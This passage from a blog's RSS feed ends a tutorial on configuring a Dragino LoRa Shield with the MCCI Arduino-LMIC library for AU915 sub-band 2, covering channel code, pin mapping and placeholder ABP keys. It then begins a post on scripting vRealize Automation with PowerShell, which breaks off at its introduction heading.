    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;868300000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7B&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;868500000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;867100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;867300000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;867500000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;867700000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;867900000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;868800000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_FSK&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  DR_FSK&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_MILLI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g2-band&lt;/span&gt;
    &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token function&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CFG_us915&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_selectSubBand&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note how the US915 frequency is configured to only use sub-band 2. This is configured by the line: &lt;code class=&quot;language-text&quot;&gt;LMIC_selectSubBand(1);&lt;/code&gt;. This is a simple function provided by the library to only enable a specific set of channels, called a sub-band. &lt;/p&gt;
&lt;p&gt;So basically, we need to perform additional configuration of the frequency we have chosen. So far I have been discussing AU915 (or AU921 as MCCI called it). The following code addition forces only the AU915 sub-band 2 to be specified. This means that only the channels in sub-band 2 will be enabled, and all other channels will be disabled.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Modifications to operate on AU915 sub-band 2&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token function&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CFG_au921&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
Serial&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Loading AU915 Configuration...&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;LMIC_selectSubBand&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// Set to AU915 sub-band 2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above code is relatively straightforward - thanks to MCCI who wrote some nice definitions and methods for the frequency. It is important to note that this function requires the sub-band required to be &lt;em&gt;one less&lt;/em&gt; that the actual sub-band required.&lt;/p&gt;
&lt;p&gt;NOTE: This modification has already been made in the &lt;code class=&quot;language-text&quot;&gt;Dragino_MCCI_ABP_AU915.ino&lt;/code&gt; sketch file, so no changes are required. &lt;/p&gt;
&lt;h4 id=&quot;dragino-lora-shield-pin-mapping&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dragino-lora-shield-pin-mapping&quot; aria-label=&quot;dragino lora shield pin mapping permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dragino LoRa Shield Pin Mapping&lt;/h4&gt;
&lt;p&gt;The pin mapping configuration that was supplied with the original sketch file was for the &lt;a href=&quot;https://www.adafruit.com/products/3178&quot;&gt;Adafruit Feather M0 LoRa&lt;/a&gt;, which is the same configuration used for the &lt;a href=&quot;https://store.mcci.com/collections/lorawan-iot-and-the-things-network/products/catena-4450-lorawan-iot-device&quot;&gt;MCCI Catena 4450&lt;/a&gt; and &lt;a href=&quot;https://store.mcci.com/collections/lorawan-iot-and-the-things-network/products/catena-4460-sensor-wing-w-bme680&quot;&gt;Catena 4460&lt;/a&gt; products. However, we want to set the pin mappings for the Dragino LoRa Shield. We need to set the ping mapping to the following values. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Pin mapping for Dragino LoRa Shield&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; lmic_pinmap lmic_pins &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;nss &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rxtx &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; LMIC_UNUSED_PIN&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rst &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dio &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;NOTE: This modification has already been made in the &lt;code class=&quot;language-text&quot;&gt;Dragino_MCCI_ABP_AU915.ino&lt;/code&gt; sketch file, so no changes are required. &lt;/p&gt;
&lt;h4 id=&quot;setting-the-abp-keys-and-device-address&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#setting-the-abp-keys-and-device-address&quot; aria-label=&quot;setting the abp keys and device address permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Setting the ABP Keys and Device Address&lt;/h4&gt;
&lt;p&gt;Make sure you remember to &lt;strong&gt;change the ABP properties in the sketch file&lt;/strong&gt;. You need to replace the &lt;code class=&quot;language-text&quot;&gt;FILLMEIN&lt;/code&gt; placeholders with the network session key, application session key and device address. The block of code is displayed for reference below.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// LoRaWAN NwkSKey, network session key&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; PROGMEM &lt;span class=&quot;token class-name&quot;&gt;u1_t&lt;/span&gt; NWKSKEY&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; FILLMEIN &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// LoRaWAN AppSKey, application session key&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;u1_t&lt;/span&gt; PROGMEM APPSKEY&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; FILLMEIN &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// LoRaWAN end-device address (DevAddr)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;u4_t&lt;/span&gt; DEVADDR &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; FILLMEIN&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// &amp;lt;-- Change this address for every node!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;NOTE: &lt;strong&gt;This modification has not been made in the &lt;code class=&quot;language-text&quot;&gt;Dragino_MCCI_ABP_AU915.ino&lt;/code&gt; sketch file&lt;/strong&gt;, so you must make these changes. &lt;/p&gt;
&lt;h4 id=&quot;checking-functionality&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#checking-functionality&quot; aria-label=&quot;checking functionality permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Checking Functionality&lt;/h4&gt;
&lt;p&gt;Now that all the modifications have been made, we can compile and upload the sketch to the Arduino Uno. All you need to do is hit the &lt;em&gt;Upload&lt;/em&gt; button in the Arduino IDE to compile, then load the sketch onto the device. Make sure you have the correct COM port selected. The sketch configured that the Serial Monitor is set to &lt;code class=&quot;language-text&quot;&gt;115200&lt;/code&gt;. So open by navigating to &lt;em&gt;Tools&lt;/em&gt;, &lt;em&gt;Serial Monitor&lt;/em&gt; and set the baud to &lt;code class=&quot;language-text&quot;&gt;115200&lt;/code&gt;. You should see output similar to the listing below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Starting
Loading AU915 Configuration...
6853: EV_TXSTART
Packet queued
Sending packet on frequency:917400000
256551: EV_TXCOMPLETE (includes waiting for RX windows)
4006984: EV_TXSTART
Packet queued
Sending packet on frequency:916800000
4277002: EV_TXCOMPLETE (includes waiting for RX windows)
8027439: EV_TXSTART
Packet queued
Sending packet on frequency:917200000
8275202: EV_TXCOMPLETE (includes waiting for RX windows)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Notice how we are sending packets on the correct AU915 channels including: &lt;code class=&quot;language-text&quot;&gt;917.4&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;917.2&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;916.8&lt;/code&gt;. I confirmed the device was working correctly by checking our LoRaWAN gateway packet forwarder logs. I also checked that the data was getting to the server, but subscribing to the MQTT topic for the node I added and could see &lt;code class=&quot;language-text&quot;&gt;SGVsbG8sIHdvcmxkIQ==&lt;/code&gt; in the data fields of the JSON, easily decoded from base64 to: &lt;code class=&quot;language-text&quot;&gt;Hello, world!&lt;/code&gt;, as specified in the sketch file code.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This post covered another method for getting the Dragino LoRa Shield to work with the Australian and New Zealand LoRaWAN frequency using the MCCI Arudino-LMIC library. I think the library is a good solution and implements the AU915 (what they call AU921) correctly. It is a much more elegant approach than my &lt;em&gt;hacky&lt;/em&gt; fix to the original Arduino-LMIC library, and recommend to anyone who wants to configure a LoRaWAN node on an Arduino-based device such as the Dragino LoRa Shield or similar Arduino-based device.&lt;/p&gt;
&lt;p&gt;If you have any feedback or questions please post a comment below. Also, if anyone knows any other Arduino-LMIC or LoRaWAN libraries that they like for LoRaWAN nodes, please feel free to share them below in the comments. Thanks!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Scripting vRealize Automation using PowerShell]]></title><description><![CDATA[I finally found an answer to a problem that had plagued me for months! How to script, or automate, tasks in vRealize; for example…]]></description><link>https://thomaslaurenson.com/blog/2018-07-18/scripting-vrealize-automation-using-powershell/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-18/scripting-vrealize-automation-using-powershell/</guid><pubDate>Wed, 18 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I finally found an answer to a problem that had plagued me for months! How to script, or automate, tasks in vRealize; for example, destroying a deployed blueprint. The answer was simpler than I initially thought… It turns out that the &lt;em&gt;Catalog Service&lt;/em&gt; REST API provides all that functionality that is required to automate specific tasks such as request a Blueprint to be deployed (built), get the IP address of a VM, or destroy a deployed blueprint.&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#vrealize-automation-7-rest-api-request-using-powershell&quot;&gt;vRealize Automation 7 REST API Request Using PowerShell&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#connecting-to-a-vrealize-server&quot;&gt;Connecting to a vRealize server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#listing-catalog-items-listing-available-blueprints&quot;&gt;Listing Catalog Items (Listing Available Blueprints)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
